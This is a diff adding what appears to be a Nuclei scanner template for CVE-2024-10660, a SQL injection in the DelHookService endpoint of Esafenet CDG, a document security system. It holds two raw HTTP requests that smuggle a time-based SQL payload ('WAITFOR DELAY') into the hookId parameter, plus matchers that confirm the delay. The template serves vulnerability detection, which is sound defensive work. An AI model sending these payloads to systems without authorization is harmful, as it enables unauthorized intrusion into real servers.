@@ -1,0 +1,40 @@
+id: cve-2024-10660
+info:
+  name: 亿赛通CDG电子文档安全管理系统DelHookService存在sql注入漏洞(CVE-2024-10660)
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection,CVE-2024-10660
+  description: |
+    亿赛通CDG电子文档安全管理系统 DelHookService 存在 SQL 注入漏洞，攻击者可利用该漏洞执行延时操作。
+variables:
+  t1: '{{rand_int(5,9)}}'
+  t2: '{{to_number(t1) + 2}}'
+  t3: '{{rand_int(1,4)}}'
+  t4: '{{to_number(t3) + 2}}'
+http:
+  - raw:
+      - |
+        GET /CDGServer3/parameter/HookService;logindojojs?command=DelHookService&hookId=1';if(1=1)+WAITFOR+DELAY+'0:0:{{t1}}'-- HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 404
+          - contains(body, "Freedom LiFe")
+          - contains_any(gbk_decode(body), "您访问的页面不存在", "您访问的页面不存在")
+          - duration >= to_number(t1)
+          - duration <= to_number(t2)
+  - raw:
+      - |
+        GET /CDGServer3/parameter/HookService;logindojojs?command=DelHookService&hookId=1';if(1=1)+WAITFOR+DELAY+'0:0:{{t3}}'-- HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 404
+          - contains(body, "Freedom LiFe")
+          - contains_any(gbk_decode(body), "您访问的页面不存在", "您访问的页面不存在")
+          - duration >= to_number(t3)
+          - duration <= to_number(t4)
